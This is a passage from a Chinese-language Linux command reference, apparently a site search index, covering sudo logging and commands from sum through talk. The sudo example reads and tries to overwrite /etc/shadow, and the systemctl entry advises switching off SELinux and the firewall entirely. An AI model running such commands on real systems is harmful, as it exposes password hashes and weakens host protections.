/rootanaconda-ks.cfg Desktop install.log\ninstall.log.syslog\n```\n\n当然，你也可以说“某些命令用户foobar不可以运行”，通过使用!操作符，但这不是一个好主意。因为，用!操作符来从ALL中“剔出”一些命令一般是没什么效果的，一个用户完全可以把那个命令拷贝到别的地方，换一个名字后再来运行。\n\n **日志与安全** \n\nsudo为安全考虑得很周到，不仅可以记录日志，还能在有必要时向系统管理员报告。但是，sudo的日志功能不是自动的，必须由管理员开启。这样来做：\n\n```shell\ntouch /var/log/sudo\nvi /etc/syslog.conf\n```\n\n在syslog.conf最后面加一行（必须用tab分割开）并保存：\n\n```shell\nlocal2.debug                    /var/log/sudo\n```\n\n重启日志守候进程，\n\n```shell\nps aux grep syslogd\n```\n\n把得到的syslogd进程的PID（输出的第二列是PID）填入下面：\n\n```shell\nkill –HUP PID\n```\n\n这样，sudo就可以写日志了：\n\n```shell\n[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg\nDesktop install.log\ninstall.log.syslog\n$cat /var/log/sudoJul 28 22:52:54 localhost sudo:   foobar :\nTTY=pts/1 ; pwd=/home/foobar ; USER=root ; command=/bin/ls /root\n```\n\n不过，有一个小小的“缺陷”，sudo记录日志并不是很忠实：\n\n```shell\n[foobar@localhost ~]$ sudo cat /etc/shadow > /dev/null\ncat /var/log/sudo...Jul 28 23:10:24 localhost sudo:   foobar : TTY=pts/1 ;\nPWD=/home/foobar ; USER=root ; COMMAND=/bin/cat /etc/shadow\n```\n\n重定向没有被记录在案！为什么？因为在命令运行之前，shell把重定向的工作做完了，sudo根本就没看到重定向。这也有个好处，下面的手段不会得逞：\n\n```shell\n[foobar@localhost ~]$ sudo ls /root > /etc/shadowbash: /etc/shadow: 权限不够\n```\n\nsudo 有自己的方式来保护安全。以root的身份执行`sudo-V`，查看一下sudo的设置。因为考虑到安全问题，一部分环境变量并没有传递给sudo后面的命令，或者被检查后再传递的，比如：PATH，HOME，SHELL等。当然，你也可以通过sudoers来配置这些环境变量。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sudo"]},{"title":"【Linux 命令】sum","url":"/linux-command/sum/","content":"\n计算文件的校验码和显示块数\n\n## 补充说明\n\n**sum命令** 用于计算并显示指定文件的校验和与文件所占用的磁盘块数。\n\n###  语法\n\n```shell\nsum(选项)(参数)\n```\n\n###  选项\n\n```shell\n-r：使用BSD的校验和算法，块大小为1k；\n-s：使用system V的校验和算法，块大小为512字节。\n```\n\n###  参数\n\n文件列表：需要计算和与磁盘块数的文件列表。\n\n###  实例\n\n计算文件校验码：\n\n```shell\n[root@localhost ~]# sum insert.sql\n00827    12\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sum"]},{"title":"【Linux 命令】supervisord","url":"/linux-command/supervisord/","content":"\n配置后台服务/常驻进程的进程管家工具\n\n## 安装\n\n```shell\n# 安装 supervisord\napt-get install supervisor\n```\n\n## 实例\n\n生成配置文件 `/etc/supervisord.conf`\n\n```shell\n[program:app]\ncommand=/usr/bin/gunicorn -w 1 wsgiapp:application\ndirectory=/srv/www\nuser=www-data\n```\n\nsupervisord: 启动 supervisor 服务\n\n```shell\nsupervisorctl start app\nsupervisorctl stop app\nsupervisorctl reload # 修改/添加配置文件需要执行这个\n```\n\n## 下载地址\n\nhttps://pypi.python.org/pypi/meld3  \nhttps://pypi.python.org/pypi/supervisor  ","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","supervisord"]},{"title":"【Linux 命令】suspend","url":"/linux-command/suspend/","content":"\n挂起shell的执行。\n\n## 概要\n\n```shell\nsuspend [-f]\n```\n\n## 主要用途\n\n- 挂起shell的执行，直到收到`SIGCONT`信号。\n\n- 除非使用`-f`选项，否则无法对`login shell`使用。\n\n\n## 选项\n\n```shell\n-f    对login shell执行挂起操作。\n```\n\n## 返回值\n\n返回成功除非未开启作业控制或发生了错误。\n\n## 例子\n\n```shell\n# 打开一个终端，首先获取PID。\necho $$\n# 执行挂起命令\nsuspend\n```\n\n```shell\n# 再打开一个终端，发送SIGCONT命令\nkill -s SIGCONT PID\n# 此时之前的终端结束挂起状态，可以正常交互。\n```\n\n### 注意\n\n1. `bash`的作业控制命令包括`bg fg kill wait disown suspend`。\n2. 该命令需要`set`选项`monitor`处于开启状态时才能执行；查看作业控制状态：输入`set -o`查看`monitor`行；执行`set -o monitor`或`set -m`开启该选项。\n3. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","suspend"]},{"title":"【Linux 命令】swapoff","url":"/linux-command/swapoff/","content":"\n关闭指定的交换空间\n\n## 补充说明\n\n**swapoff命令** 用于关闭指定的交换空间（包括交换文件和交换分区）。swapoff实际上为swapon的符号连接，可用来关闭系统的交换区。\n\n###  语法\n\n```shell\nswapoff(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：关闭配置文件“/etc/fstab”中所有的交换空间。\n```\n\n###  参数\n\n交换空间：指定需要激活的交换空间，可以是交换文件和交换分区，如果是交换分区则指定交换分区对应的设备文件。\n\n###  实例\n\n关闭交换分区\n\n```shell\nswapoff /dev/sda2\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","swapoff"]},{"title":"【Linux 命令】swapon","url":"/linux-command/swapon/","content":"\n激活Linux系统中交换空间\n\n## 补充说明\n\n**swapon命令** 用于激活Linux系统中交换空间，Linux系统的内存管理必须使用交换区来建立虚拟内存。\n\n###  语法\n\n```shell\nswapon(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：将/etc/fstab文件中所有设置为swap的设备，启动为交换区；\n-h：显示帮助；\n-p<优先顺序>：指定交换区的优先顺序；\n-s：显示交换区的使用状况；\n-V：显示版本信息。\n```\n\n###  参数\n\n交换空间：指定需要激活的交换空间，可以是交换文件和交换分区，如果是交换分区则指定交换分区对应的设备文件。\n\n###  实例\n\n```shell\nmkswap -c /dev/hdb4 （-c是检查有无坏块）\nswapon -v /dev/hdb4\nswapon -s\nFilename                                type            Size    Used    Priority\n/dev/hda5                               partition       506008 96      -1\n/dev/hdb4                               partition       489972 0       -2\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","swapon"]},{"title":"【Linux 命令】sync","url":"/linux-command/sync/","content":"\n用于强制被改变的内容立刻写入磁盘\n\n## 补充说明\n\n**sync命令** 用于强制被改变的内容立刻写入磁盘，更新超块信息。\n\n在Linux/Unix系统中，在文件或数据处理过程中一般先放到内存缓冲区中，等到适当的时候再写入磁盘，以提高系统的运行效率。sync命令则可用来强制将内存缓冲区中的数据立即写入磁盘中。用户通常不需执行sync命令，系统会自动执行update或bdflush操作，将缓冲区的数据写 入磁盘。只有在update或bdflush无法执行或用户需要非正常关机时，才需手动执行sync命令。\n\n###  语法\n\n```shell\nsync(选项)\n```\n\n###  选项\n\n```shell\n-d, --data             只同步文件数据，不同步不必要的元数据\n-f, --file-system      同步包含这些文件的文件系统\n--help：显示帮助；\n--version：显示版本信息。\n```\n\n###  buffer与cache\n\n*   buffer：为了解决写磁盘的效率\n*   cache：为了解决读磁盘的效率\n\nlinux系统为了提高读写磁盘的效率，会先将数据放在一块buffer中。在写磁盘时并不是立即将数据写到磁盘中，而是先写入这块buffer中了。此时如果重启系统，就可能造成数据丢失。\n\nsync命令用来flush文件系统buffer，这样数据才会真正的写到磁盘中，并且buffer才能够释放出来，flush就是用来清空buffer。sync命令会强制将数据写入磁盘中，并释放该数据对应的buffer，所以常常会在写磁盘后输入sync命令来将数据真正的写入磁盘。\n\n如果不去手动的输入sync命令来真正的去写磁盘，linux系统也会周期性的去sync数据。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sync"]},{"title":"【Linux 命令】sysctl","url":"/linux-command/sysctl/","content":"\n时动态地修改内核的运行参数\n\n## 补充说明\n\n**sysctl命令** 被用于在内核运行时动态地修改内核的运行参数，可用的内核参数在目录`/proc/sys`中。它包含一些TCP/ip堆栈和虚拟内存系统的高级选项， 这可以让有经验的管理员提高引人注目的系统性能。用sysctl可以读取设置超过五百个系统变量。\n\n###  语法\n\n```shell\nsysctl(选项)(参数)\n```\n\n###  选项\n\n```shell\n-n：打印值时不打印关键字；\n-e：忽略未知关键字错误；\n-N：仅打印名称；\n-w：当改变sysctl设置时使用此项；\n-p：从配置文件“/etc/sysctl.conf”加载内核参数设置；\n-a：打印当前所有可用的内核参数变量和值；\n-A：以表格方式打印当前所有可用的内核参数变量和值。\n```\n\n###  参数\n\n变量=值：设置内核参数对应的变量值。\n\n###  实例\n\n查看所有可读变量：\n\nsysctl -a\n\n读一个指定的变量，例如`kern.maxproc`：\n\nsysctl kern.maxproc kern.maxproc: 1044\n\n要设置一个指定的变量，直接用`variable=value`这样的语法：\n\n```shell\nsysctl kern.maxfiles=5000\nkern.maxfiles: 2088 -> 5000\n```\n\n您可以使用sysctl修改系统变量，也可以通过编辑sysctl.conf文件来修改系统变量。sysctl.conf看起来很像rc.conf。它用`variable=value`的形式来设定值。指定的值在系统进入多用户模式之后被设定。并不是所有的变量都可以在这个模式下设定。\n\nsysctl变量的设置通常是字符串、数字或者布尔型。（布尔型用 1 来表示'yes'，用 0 来表示'no'）。\n\n```shell\nsysctl -w kernel.sysrq=0\nsysctl -w kernel.core_uses_pid=1\nsysctl -w net.ipv4.conf.default.accept_redirects=0\nsysctl -w net.ipv4.conf.default.accept_source_route=0\nsysctl -w net.ipv4.conf.default.rp_filter=1\nsysctl -w net.ipv4.tcp_syncookies=1\nsysctl -w net.ipv4.tcp_max_syn_backlog=2048\nsysctl -w net.ipv4.tcp_fin_timeout=30\nsysctl -w net.ipv4.tcp_synack_retries=2\nsysctl -w net.ipv4.tcp_keepalive_time=3600\nsysctl -w net.ipv4.tcp_window_scaling=1\nsysctl -w net.ipv4.tcp_sack=1\n```\n\n###  配置sysctl\n\n编辑此文件：`/etc/sysctl.conf`\n\n如果该文件为空，则输入以下内容，否则请根据情况自己做调整：\n\n```shell\n# Controls source route verification\n# Default should work for all interfaces\nnet.ipv4.conf.default.rp_filter = 1\n# net.ipv4.conf.all.rp_filter = 1\n# net.ipv4.conf.lo.rp_filter = 1\n# net.ipv4.conf.eth0.rp_filter = 1\n\n# Disables IP source routing\n# Default should work for all interfaces\nnet.ipv4.conf.default.accept_source_route = 0\n# net.ipv4.conf.all.accept_source_route = 0\n# net.ipv4.conf.lo.accept_source_route = 0\n# net.ipv4.conf.eth0.accept_source_route = 0\n\n# Controls the System Request debugging functionality of the kernel\nkernel.sysrq = 0\n\n# Controls whether core dumps will append the PID to the core filename.\n# Useful for debugging multi-threaded applications.\nkernel.core_uses_pid = 1\n\n# Increase maximum amount of memory allocated to shm\n# Only uncomment if needed!\n# kernel.shmmax = 67108864\n\n# Disable ICMP Redirect Acceptance\n# Default should work for all interfaces\nnet.ipv4.conf.default.accept_redirects = 0\n# net.ipv4.conf.all.accept_redirects = 0\n# net.ipv4.conf.lo.accept_redirects = 0\n# net.ipv4.conf.eth0.accept_redirects = 0\n\n# enable Log Spoofed Packets, Source Routed Packets, Redirect Packets\n# Default should work for all interfaces\nnet.ipv4.conf.default.log_martians = 1\n# net.ipv4.conf.all.log_martians = 1\n# net.ipv4.conf.lo.log_martians = 1\n# net.ipv4.conf.eth0.log_martians = 1\n\n# Decrease the time default value for tcp_fin_timeout connection\nnet.ipv4.tcp_fin_timeout = 25\n\n# Decrease the time default value for tcp_keepalive_time connection\nnet.ipv4.tcp_keepalive_time = 1200\n\n# Turn on the tcp_window_scaling\nnet.ipv4.tcp_window_scaling = 1\n\n# Turn on the tcp_sack\nnet.ipv4.tcp_sack = 1\n\n# tcp_fack should be on because of sack\nnet.ipv4.tcp_fack = 1\n\n# Turn on the tcp_timestamps\nnet.ipv4.tcp_timestamps = 1\n\n# Enable TCP SYN Cookie Protection\nnet.ipv4.tcp_syncookies = 1\n\n# Enable ignoring broadcasts request\nnet.ipv4.icmp_echo_ignore_broadcasts = 1\n\n# Enable bad error message Protection\nnet.ipv4.icmp_ignore_bogus_error_responses = 1\n\n# make more local ports available\n# net.ipv4.ip_local_port_range = 1024 65000\n\n# set TCP Re-Ordering value in kernel to ‘5′\nnet.ipv4.tcp_reordering = 5\n\n# Lower syn retry rates\nnet.ipv4.tcp_synack_retries = 2\nnet.ipv4.tcp_syn_retries = 3\n\n# Set Max SYN Backlog to ‘2048′\nnet.ipv4.tcp_max_syn_backlog = 2048\n\n# Various Settings\nnet.core.netdev_max_backlog = 1024\n\n# Increase the maximum number of skb-heads to be cached\nnet.core.hot_list_length = 256\n\n# Increase the tcp-time-wait buckets pool size\nnet.ipv4.tcp_max_tw_buckets = 360000\n\n# This will increase the amount of memory available for socket input/output queues\nnet.core.rmem_default = 65535\nnet.core.rmem_max = 8388608\nnet.ipv4.tcp_rmem = 4096 87380 8388608\nnet.core.wmem_default = 65535\nnet.core.wmem_max = 8388608\nnet.ipv4.tcp_wmem = 4096 65535 8388608\nnet.ipv4.tcp_mem = 8388608 8388608 8388608\nnet.core.optmem_max = 40960\n```\n\n如果希望屏蔽别人 ping 你的主机，则加入以下代码：\n\n```shell\n# Disable ping requests\nnet.ipv4.icmp_echo_ignore_all = 1\n```\n\n编辑完成后，请执行以下命令使变动立即生效：\n\n```shell\n/sbin/sysctl -p\n/sbin/sysctl -w net.ipv4.route.flush=1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sysctl"]},{"title":"【Linux 命令】syslog","url":"/linux-command/syslog/","content":"\n系统默认的日志守护进程\n\n## 补充说明\n\n**syslog** 是Linux系统默认的日志守护进程。默认的syslog配置文件是/etc/syslog.conf文件。程序，守护进程和内核提供了访问系统的日志信息。因此，任何希望生成日志信息的程序都可以向 syslog 接口呼叫生成该信息。\n\n几乎所有的网络设备都可以通过syslog协议，将日志信息以用户数据报协议(UDP)方式传送到远端服务器，远端接收日志服务器必须通过syslogd监听UDP 端口514，并根据 syslog.conf配置文件中的配置处理本机，接收访问系统的日志信息，把指定的事件写入特定文件中，供后台数据库管理和响应之用。意味着可以让任何事件都登录到一台或多台服务器上，以备后台数据库用off-line(离线) 方法分析远端设备的事件。\n\n通常，syslog 接受来自系统的各种功能的信息，每个信息都包括重要级。/etc/syslog.conf 文件通知 syslogd 如何根据设备和信息重要级别来报告信息。\n\n### 使用方法\n\n在/var/log中创建并写入日志信息是由syslog协议处理的，是由守护进程sylogd负责执行。每个标准的进程都可以用syslog记录日志。可以使用logger命令通过syslogd记录日志。\n\n要向syslog文件/var/log/messages中记录日志信息：\n\n```shell\nlogger this is a test log line\n\n输出：\ntail -n 1 messages\nJan  5 10:07:03 localhost root: this is a test log line\n```\n\n如果要记录特定的标记（tag）可以使用：\n\n```shell\nlogger -t TAG this is a test log line\n\n输出：\ntail -n 1 messages\nJan  5 10:37:14 localhost TAG: this is a test log line\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","syslog"]},{"title":"【Linux 命令】systemctl","url":"/linux-command/systemctl/","content":"\n系统服务管理器指令\n\n## 补充说明\n\n**systemctl命令** 是系统服务管理器指令，它实际上将 service 和 chkconfig 这两个命令组合到一起。\n\n| 任务 | 旧指令 | 新指令 |\n| ---- | ---- | ---- |\n| 使某服务自动启动 | chkconfig --level 3 httpd on | systemctl enable httpd.service |\n| 使某服务不自动启动 | chkconfig --level 3 httpd off | systemctl disable httpd.service |\n| 检查服务状态 | service httpd status | systemctl status httpd.service （服务详细信息） systemctl is-active httpd.service （仅显示是否 Active) |\n| 显示所有已启动的服务 | chkconfig --list | systemctl list-units --type=service |\n| 启动服务 | service httpd start | systemctl start httpd.service |\n| 停止服务 | service httpd stop | systemctl stop httpd.service |\n| 重启服务 | service httpd restart | systemctl restart httpd.service |\n| 重载服务 | service httpd reload | systemctl reload httpd.service |\n\n### 实例\n\n```shell\nsystemctl start nfs-server.service . # 启动nfs服务\nsystemctl enable nfs-server.service # 设置开机自启动\nsystemctl disable nfs-server.service # 停止开机自启动\nsystemctl status nfs-server.service # 查看服务当前状态\nsystemctl restart nfs-server.service # 重新启动某服务\nsystemctl list-units --type=service # 查看所有已启动的服务\n```\n\n开启防火墙22端口\n\n```shell\niptables -I INPUT -p tcp --dport 22 -j accept\n```\n\n如果仍然有问题，就可能是SELinux导致的\n\n关闭SElinux：\n\n修改`/etc/selinux/config`文件中的`SELINUX=\"\"`为disabled，然后重启。\n\n彻底关闭防火墙：\n\n```shell\nsudo systemctl status firewalld.service\nsudo systemctl stop firewalld.service          \nsudo systemctl disable firewalld.service\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","systemctl"]},{"title":"【Linux 命令】systool","url":"/linux-command/systool/","content":"\n显示基于总线、类和拓扑显示系统中设备的信息\n\n## 补充说明\n\n**systool命令** 指令显示基于总线、类和拓扑显示系统中设备的信息。\n\n###  语法\n\n```shell\nsystool(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：显示被请求资源的属性；\n-b<总线>：显示指定总线的信息；\n-c<class>：显示指定类的信息；\n-d：仅显示设备；\n-h：显示指令的用法；\n-m<模块名称>：显示指定模块的信息；\n-p：显示资源的“sysfs”绝对路径；\n-v：显示所有属性；\n-A<属性>：显示请求资源的属性值；\n-D：仅显示驱动程序信息；\n-P：显示设备的父类。\n```\n\n###  参数\n\n设备：指定要查看信息的设备名称。\n\n###  实例\n\n```shell\n[root@localhost ~]# systool\nSupported sysfs buses:\n        acpi\n        i2c\n        ide\n        pci_express\n        pci\n        pcmcia\n        platform\n        pnp\n        scsi\n        serio\n        usb\nSupported sysfs classes:\n        backlight\n        cpuid\n        dma_v3\n        firmware\n        graphics\n        hidraw\n        hwmon\n        i2c-adapter\n        input\n        leds\n        mem\n        misc\n        msr\n        net\n        pci_bus\n        pcmcia_socket\n        printer\n        raw\n        sas_device\n        sas_end_device\n        sas_expander\n        sas_host\n        sas_phy\n        sas_port\n        scsi_device\n        scsi_disk\n        scsi_generic\n        scsi_host\n        sound\n        tty\n        usb_device\n        usb_endpoint\n        usb_host\n        vc\n        vtconsole\nSupported sysfs devices:\n        acpi\n        pci0000:00\n        platform\n        pnp0\n        sequencer2\n        sequencer\n        seq\n        system\n        timer\nSupported sysfs modules:\n        8250\n        acpi_memhotplug\n        ac\n        asus_acpi\n        ata_piix\n        auth_rpcgss\n        backlight\n        battery\n        button\n        cifs\n        cpufreq\n        crypto_api\n        dell_wmi\n        dm_log\n        dm_mem_cache\n        dm_message\n        dm_mirror\n        dm_mod\n        dm_multipath\n        dm_raid45\n        dm_region_hash\n        dock\n        e1000e\n        edac_mc\n        ehci_hcd\n        exportfs\n        ext3\n        hwmon\n        i2c_core\n        i2c_ec\n        i2c_i801\n        i7core_edac\n        i8042\n        ip_conntrack_netbios_ns\n        ip_conntrack\n        ip_tables\n        iptable_filter\n        ipv6\n        it821x\n        jbd\n        joydev\n        keyboard\n        libata\n        lockd\n        lp\n        md_mod\n        mousedev\n        mpt2sas\n        nfnetlink\n        nfs_acl\n        nfsd\n        nls_utf8\n        ohci_hcd\n        parport_pc\n        parport\n        pci_hotplug\n        pcmcia\n        pcmcia_core\n        pcspkr\n        piix\n        power_meter\n        printk\n        processor\n        psmouse\n        rsrc_nonstatic\n        sbs\n        scsi_dh\n        scsi_mod\n        scsi_transport_sas\n        sd_mod\n        serio_raw\n        sg\n        shpchp\n        snd_hda_intel\n        snd_hwdep\n        snd_mixer_oss\n        snd_page_alloc\n        snd_pcm_oss\n        snd_pcm\n        snd_seq_device\n        snd_seq_dummy\n        snd_seq_midi_event\n        snd_seq_oss\n        snd_seq\n        snd_timer\n        snd\n        soundcore\n        sunrpc\n        tcp_bic\n        tpm_bios\n        tpm_tis\n        tpm\n        uhci_hcd\n        usbcore\n        usbhid\n        video\n        wmi\n        x_tables\n        xfrm_nalgo\n        xt_limit\n        xt_state\n        xt_tcpudp\n        yenta_socket\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","systool"]},{"title":"【Linux 命令】tac","url":"/linux-command/tac/","content":"\n连接多个文件并以行为单位反向打印到标准输出。\n\n## 概要\n\n```shell\ntac [OPTION]... [FILE]...\n```\n\n## 主要用途\n\n- 按行为单位反向显示文件内容，如果没有文件或文件为`-`则读取标准输入。\n- 处理多个文件时，依次将每个文件反向显示，而不是将所有文件连在一起再反向显示。\n\n\n## 参数\n\nFILE（可选）：要处理的文件，可以为一或多个。\n\n## 选项 \n\n```shell\n长选项与短选项等价\n\n-b, --before              在之前而不是之后连接分隔符。\n-r, --regex               将分隔符作为基础正则表达式（BRE）处理。\n-s, --separator=STRING    使用STRING作为分隔符代替默认的换行符。\n--help                    显示帮助信息并退出。\n--version                 显示版本信息并退出。\n```\n\n## 返回值\n\n返回状态为成功除非给出了非法选项或非法参数。\n\n## 例子 \n\n```shell\n# 选自官方info文档的例子：\n# 一个接着一个字符的反转一个文件：\ntac -r -s 'x\\|[^x]' test.log\n\n# 关于-b选项：\nseq 1 3 |tac\n# 输出\n3\n2\n1\n# 使用-b选项：\nseq 1 3 |tac -b\n# 输出，注意21后面没有换行符：\n\n\n3\n21\n# 前一个例子相当于将 '1\\n2\\n3\\n' 转换为 '3\\n2\\n1\\n'\n# 前一个例子相当于将 '1\\n2\\n3\\n' 转换为 '\\n\\n3\\n21'\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 tac`或`info coreutils 'tac invocation'`。\n2. 关于基础正则表达式（BRE）的内容，详见`man -s 1 grep`的`REGULAR EXPRESSIONS`段落。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tac"]},{"title":"【Linux 命令】tail","url":"/linux-command/tail/","content":"\n在屏幕上显示指定文件的末尾若干行\n\n## 补充说明\n\n**tail命令** 用于输入文件中的尾部内容。\n- 默认在屏幕上显示指定文件的末尾10行。\n- 处理多个文件时会在各个文件之前附加含有文件名的行。\n- 如果没有指定文件或者文件名为`-`，则读取标准输入。\n- 如果表示字节或行数的`NUM`值之前有一个`+`号，则从文件开头的第`NUM`项开始显示，而不是显示文件的最后`NUM`项。\n- `NUM`值后面可以有后缀：\n  - `b`  : 512\n  - `kB` : 1000\n  - `k ` : 1024\n  - `MB` : 1000 * 1000\n  - `M ` : 1024 * 1024\n  - `GB` : 1000 * 1000 * 1000\n  - `G ` : 1024 * 1024 * 1024\n  - `T`、`P`、`E`、`Z`、`Y`等以此类推。\n\n### 语法\n\n```shell\ntail (选项) (参数)\n```\n\n### 选项\n\n```shell\n-c, --bytes=NUM                 输出文件尾部的NUM（NUM为整数）个字节内容。\n-f, --follow[={name|descript}]  显示文件最新追加的内容。“name”表示以文件名的方式监视文件的变化。\n-F                              与 “--follow=name --retry” 功能相同。\n-n, --line=NUM                  输出文件的尾部NUM（NUM位数字）行内容。\n--pid=<进程号>                  与“-f”选项连用，当指定的进程号的进程终止后，自动退出tail命令。\n-q, --quiet, --silent           当有多个文件参数时，不输出各个文件名。\n--retry                         即是在tail命令启动时，文件不可访问或者文件稍后变得不可访问，都始终尝试打开文件。使用此选项时需要与选项“--follow=name”连用。\n-s, --sleep-interal=<秒数>      与“-f”选项连用，指定监视文件变化时间隔的秒数。\n-v, --verbose                   当有多个文件参数时，总是输出各个文件名。\n--help                          显示指令的帮助信息。\n--version                       显示指令的版本信息。\n```\n\n### 参数\n\n文件列表：指定要显示尾部内容的文件列表。\n\n### 实例\n\n```shell\ntail file #（显示文件file的最后10行）\ntail -n +20 file #（显示文件file的内容，从第20行至文件末尾）\ntail -c 10 file #（显示文件file的最后10个字节）\n\ntail -25 mail.log # 显示 mail.log 最后的 25 行\ntail -f mail.log # 等同于--follow=descriptor，根据文件描述符进行追踪，当文件改名或被删除，追踪停止\ntail -F mail.log # 等同于--follow=name --retry，根据文件名进行追踪，并保持重试，即该文件被删除或改名后，如果再次创建相同的文件名，会继续追踪\n```\n\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tail"]},{"title":"【Linux 命令】tailf","url":"/linux-command/tailf/","content":"\n在屏幕上显示指定文件的末尾若干行内容，通常用于日志文件的跟踪输出\n\n## 补充说明\n\ntailf命令几乎等同于`tail -f`，严格说来应该与`tail --follow=name`更相似些。当文件改名之后它也能继续跟踪，特别适合于日志文件的跟踪（follow the growth of a log file）。与`tail -f`不同的是，如果文件不增长，它不会去访问磁盘文件。tailf特别适合那些便携机上跟踪日志文件，因为它能省电，因为减少了磁盘访问。tailf命令不是个脚本，而是一个用C代码编译后的二进制执行文件，某些Linux安装之后没有这个命令。\n\ntailf和tail -f的区别\n\n1. tailf 总是从文件开头一点一点的读， 而tail -f 则是从文件尾部开始读\n2. tailf check文件增长时，使用的是文件名， 用stat系统调用；而tail -f 则使用的是已打开的文件描述符； 注：tail 也可以做到类似跟踪文件名的效果； 但是tail总是使用fstat系统调用，而不是stat系统调用；结果就是：默认情况下，当tail的文件被偷偷删除时，tail是不知道的，而tailf是知道的。\n\n###  语法\n\n```shell\ntailf logfile # 动态跟踪日志文件logfile，最初的时候打印文件的最后10行内容。\n```\n\n###  选项\n\n```shell\n-n, --lines NUMBER  # 输出最后数行\n-NUMBER             # 与NUMBER相同 `-n NUMBER'\n-V, --version       # 输出版本信息并退出\n-h, --help          # 显示帮助并退出\n```\n\n###  参数\n\n目标：指定目标日志。\n\n### 实例\n\n```shell\ntailf log/WEB.LOG \ntailf -n 5 log2014.log   # 显示文件最后5行内容\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","tailf"]},{"title":"【Linux 命令】talk","url":"/linux-command/talk/","content":"\n让用户和其他用户聊天\n\n## 补充说明\n\n**talk命令** 是talk服务器的客户端工具，通过talk命令可以让用户和其他用户聊天。linux中talk命令参数程序的使用很简单，只要知道交谈对象的地址，就可以邀请对方交谈。\n\n###  语法\n\n```shell\ntalk(参数)\n```\n\n###  参数\n\n*   用户：指定聊天的用户；\n*   终端：指定用户的终端。\n\n###  实例\n\n例如登录在主机rs6000.cic.test.com上的用户jdx希望和登录在主机tirc.cs.test.com上的用户wangxz进行交谈，则可以输入下面的命令：\n\n```shell\ntalk wangxz@tirc.cs.test.com\n```\n\nInternet上的相关程序（Talk Daemon）就会传送一条信息邀请wangxz来交谈，这时用户wangxz的屏幕上就会出现如下信息，并响铃提示：\n\n```shell\nMessage from Talk_Daemon@tirc.cs.test.com at 21:44 …\ntalk: connection requested by jdx@rs6000.cic.test.com\ntalk: respond with:  talk jdx@rs6000.cic.test.com\n```\n\n这时，用户wangxz应该做的工作就是按照上面的信息提示，即输入linux中talk命令：\n\n```shell\ntalk jdx@rs6000.cic.test.com\n```\n\n之后，连接建立成功，两个用户就可以进行交谈了。这时，双方的终端屏幕上都将显示信息 **[Connection established]** 并响铃，同时屏幕被linux中talk命令程序以一条水平线分割为上下两部分，上半部分用来显示用户自己输入的内容，下半部分用来显示对方输入的内容。两个用户可以同时输入，他们输入的内容将会立即显示在双方的屏幕上。\n\n在用户进行输入时，可按 **BACKSPACE** 见来更正前一个字符，也可按 **CTRL+w** 来删除一个完整的单词，或者用 **CTRL+U** 来删除一整行，另外，用户还可以通过按 **CTRL+L** 来刷新屏幕。如果要结束交谈，可由任何一方按下 **CTRL+C** 来中断连接，但在结束对话前最好道声“再见”，并等待对方回应。linux中talk命令程序结束时，在屏幕上将回显示一条信息：\n\n```shell\n[Connection closing. Exiting]\n```\n\n并非每次要求对方交谈都能成功，有时对方没有登录，则linux中talk命令程序提示信息：\n\n```shell\n[Your party is not logged on]\n```\n\n并退出；如果对方已登录，但因某种原因（如不是正在使用机器）没有响应，那么linux中talk命令程序将会每隔10秒钟给他发一条邀请信息，同时在自己的屏幕上显示：\n\n```shell\n[Ringing your party again]\n```\n\n如果用户不愿等待，则可以按 **CTRL+C** 终止linux中talk命令程序。还有的时候系统可能出现下面的信息：\n\n```shell\n[Checking for invitation on caller’s machine]\n```\n\n这说明双方的linux中talk命令程序不兼容，这时可以试试ntalk和ytalk命令，如果没有，就只好找系统管理员了。\n\n如果用户在做某些紧急工作（如编辑邮件）时不希望被linux中talk命令的邀请打搅，他可以使用命令：\n\n```shell\nmesg n\n```\n\n来暂时拒绝交谈，这时如果有用户邀请他交谈，只能得到提示信息：\n\n```shell\n[Your party is refusing messages]\n```\n\n不过要注意的是，一旦完成紧急工作。最好立即打开信息接收开关（用命令`mesg y`），否则将会失去很多信息交流的机会。\n\n以上是linux中talk命令参数的是使用方法。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","talk"]},{"title":"【Linux 命令】tcpdump","url":"/linux-command/tcpdump/","content":"\n一款sniffer工具，是Linux上的抓包工具，嗅探器\n\n## 补充说明\n\n**tcpdump命令** 是一款抓包，嗅探器工具，它可以打印所有经过网络接口的数据包的头信息，也可以使用`-w`选项将数据包保存到文件中，方便以后分析。\n\n###  语法 \n\n```shell\ntcpdump(选项)\n```\n\n###  选项 